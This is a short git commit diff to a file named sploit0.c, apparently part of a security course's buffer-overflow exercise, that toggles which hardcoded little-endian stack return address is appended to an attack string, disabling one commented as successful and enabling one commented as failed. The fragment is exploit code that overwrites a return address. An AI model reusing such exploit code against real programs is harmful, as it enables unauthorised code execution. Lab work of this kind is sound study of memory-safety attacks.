99127ddb92da8452115ad32419be429498971fa7
pandaxuCESO <49774769+30PandaX@users.noreply.github.com>
2021-12-07 23:39:00 -0500

    Update sploit0.c

--- sploits/sploit0.c
+++ sploits/sploit0.c
@@ -30,14 +30,14 @@ int main(void)
 
     // success
     // - 150
-  	strcat(str, "\x70\xfb\xff\xbf");
+  	// strcat(str, "\x70\xfb\xff\xbf");
     // - 151
   	// strcat(str, "\x6f\xfb\xff\xbf");
 
 
     // failed
     // - 153
-  	// strcat(str, "\x6d\xfb\xff\xbf");
+  	strcat(str, "\x6d\xfb\xff\xbf");
     // - 154
   	// strcat(str, "\x6c\xfb\xff\xbf");
 
